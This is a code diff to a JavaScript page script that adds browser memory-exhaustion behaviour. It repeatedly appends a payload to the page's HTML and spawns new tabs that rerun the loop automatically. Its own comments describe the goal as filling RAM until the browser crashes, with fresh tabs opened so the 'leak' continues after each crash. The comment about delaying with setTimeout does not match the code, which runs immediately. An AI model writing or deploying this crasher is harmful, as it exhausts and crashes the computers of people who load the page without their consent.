@@ -48,7 +48,24 @@ window.onload = function () {
     for (var i = 0; i < amt; i++) {
       // using setTimeout here so the page doesn't immediately crash
       // this allows the memory to fill up more before the process ends (crashes)
-      setTimeout(document.getElementById("egg").innerHTML += payload, 5);
+      setTimeout(document.getElementById("egg").innerHTML += payload, 8);
+    }
+  };
+
+  // used to open several tabs during the process so that when one tab crashes,
+  // another is opened to further continue the ram "leak"
+  var openTabs = function openTabs(numTabs) {
+    for (var i = 0; i < numTabs; i++) {
+      window.open("html/index.html", "egg", "inner-width: 200");
+    }
+  };
+
+  // for use with openTabs
+  // if it has gray background color (used to identify tabs opened with openTabs),
+  // auto run the exploit loop
+  var autoRun = function autoRun() {
+    if (window.innerWidth === 200) {
+      fixedOverflow(amount);
     }
   };
 
